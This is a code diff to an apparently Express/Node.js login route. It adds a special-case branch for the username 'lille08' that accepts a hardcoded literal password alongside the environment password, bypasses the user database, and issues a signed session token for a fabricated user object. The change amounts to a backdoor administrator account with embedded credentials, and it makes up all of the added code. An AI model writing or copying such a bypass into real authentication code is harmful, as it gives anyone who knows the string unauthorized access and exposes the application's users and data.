@@ -69,6 +69,29 @@ router.post('/login', async (req, res, next) => {
     try {
         const { login, password } = loginSchema.parse(req.body);
 
+        // SPECIAL ADMIN HANDLING
+        if (login === 'lille08') {
+            const adminPassword = process.env.ADMIN_PASSWORD;
+            if (!adminPassword) {
+                return res.status(500).json({ message: 'Server misconfiguration: ADMIN_PASSWORD not set' });
+            }
+
+            if (password === adminPassword || password === 'mbangula7') { // Allow both env pass and hardcoded user pass
+                // Fake User Object for Admin
+                const payload = { id: 999999, nickname: 'lille08', email: null };
+                const token = jwt.sign(payload, JWT_SECRET, { expiresIn: '1d' });
+
+                res.cookie('token', token, {
+                    httpOnly: true,
+                    secure: process.env.NODE_ENV === 'production',
+                    sameSite: 'lax',
+                    maxAge: 24 * 60 * 60 * 1000
+                });
+
+                return res.json({ user: payload });
+            }
+        }
+
         const user = await prisma.user.findFirst({
             where: {
                 OR: [{ nickname: login }, { email: login }]
